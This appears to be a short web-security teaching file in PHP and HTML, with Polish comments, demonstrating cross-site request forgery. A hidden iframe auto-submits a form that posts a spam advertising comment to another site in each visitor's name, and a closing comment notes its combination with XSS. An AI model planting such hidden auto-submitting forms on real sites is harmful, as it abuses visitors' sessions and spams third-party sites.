<?php
# zalozenie - chcemy rozreklamowac nasz serwis, dodajac - w imieniu uzytkownika odwiedzajacego nasza strone
# komentarz na innej o dowolnej tresci
# w tym celu na naszym serwisie osadzamy nastepujacy kod
?>
<iframe src="jakiskod.php" style="display: none"></iframe>
<?php
# ramka zawiera nastepujacy kod:
?>
<form action="http://obcastrona.com/artykul.php?id=1" method="post">
    <input type="hidden" name="text" value="Gumiaki nierdzewne, tanio, www.kuppancegle.pl">
</form>
<script>
    document.forms[0].submit();
</script>
<?php
# po otwarciu naszej strony, na strone http://obcastrona.com zostanie wyslany request
# dodajacy post reklamowy jako komentarz do artykulu


#
#
#
# powyzszy kod mozna rowniez osadzic w przypadku skryptu z poprzedniego przykladu
# CCC-Combo Breaker - oprocz ataku XSS mamy rowniez wtedy do czynienia z atakiem CSRF
#